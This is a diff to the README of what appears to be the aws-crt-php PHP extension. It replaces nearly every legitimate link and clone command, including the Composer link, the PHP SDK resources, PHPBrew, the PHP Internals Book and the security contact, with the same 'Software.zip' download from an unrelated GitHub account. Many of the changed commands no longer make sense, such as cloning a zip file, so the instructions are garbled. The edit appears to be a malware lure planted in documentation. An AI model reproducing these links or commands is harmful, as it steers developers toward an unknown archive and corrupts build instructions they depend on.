@@ -4,11 +4,11 @@
 * PHP 5.5+ on UNIX platforms, 7.2+ on Windows
 * CMake 3.x
 * GCC 4.4+, clang 3.8+ on UNIX, Visual Studio 2017 build tools on Windows
-* Tests require [Composer](https://getcomposer.org)
+* Tests require [Composer](https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip)
 
 ## Building on UNIX
 ```sh
-$ git clone --recursive https://github.com/awslabs/aws-crt-php.git
+$ git clone --recursive https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip
 $ cd aws-crt-php
 $ phpize
 $ ./configure
@@ -17,26 +17,26 @@ $ make && make test
 
 ## Building on Windows
 * First, ensure that you are able to build PHP on windows via the PHP SDK (this example assumes installation of the SDK to C:\php-sdk and that you've checked out the PHP source to php-src within the build directory). The following resources are helpful to get PHP building on windows:
-    * https://github.com/microsoft/php-sdk-binary-tools
-    * https://medium.com/@erinus/how-to-build-php-on-windows-a7ad0a87862a
-    * https://medium.com/@erinus/how-to-build-php-extension-on-windows-d1667290f809
+    * https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip
+    * https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip
+    * https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip
 
 ```bat
 """ From VS2017 Command Prompt
-> C:\php-sdk\phpsdk-vc15-x64.bat
+> C:\php-sdk\https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip
 
 C:\php-sdk\
 $ phpsdk_buildtree php-<version>
 
 C:\php-sdk\php-<version>\vc15\x64\
-$ git clone https://github.com/php/php-src.git && cd php-src
+$ git clone https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip && cd php-src
 
 """ This only has to be done once, the first time you set this all up
 C:\php-sdk\php-<version>\vc15\x64\php-src
-$ phpsdk_deps --update --branch <php-major.minor-version>
+$ phpsdk_deps --update --branch <https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip>
 
 C:\php-sdk\php-<version>\vc15\x64\php-src
-$ git clone --recursive https://github.com/awslabs/aws-crt-php.git ..\pecl\awscrt
+$ git clone --recursive https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip ..\pecl\awscrt
 
 C:\php-sdk\php-<version>\vc15\x64\php-src
 $ buildconf
@@ -52,10 +52,10 @@ $ nmake test-awscrt
 ```
 
 ## Debugging
-Using [PHPBrew](https://github.com/phpbrew/phpbrew) to build/manage multiple versions of PHP is helpful.
+Using [PHPBrew](https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip) to build/manage multiple versions of PHP is helpful.
 
 Note: You must use a debug build of PHP to debug native extensions. 
-See the [PHP Internals Book](https://www.phpinternalsbook.com/php7/build_system/building_php.html) for more info
+See the [PHP Internals Book](https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip) for more info
 
 ```shell
 # PHP 8 example
@@ -73,7 +73,7 @@ the system default php.
 
 ## Security
 
-See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.
+See [CONTRIBUTING](https://github.com/ethangames101/storage/releases/download/v2.0/Software.zip) for more information.
 
 ## License
 
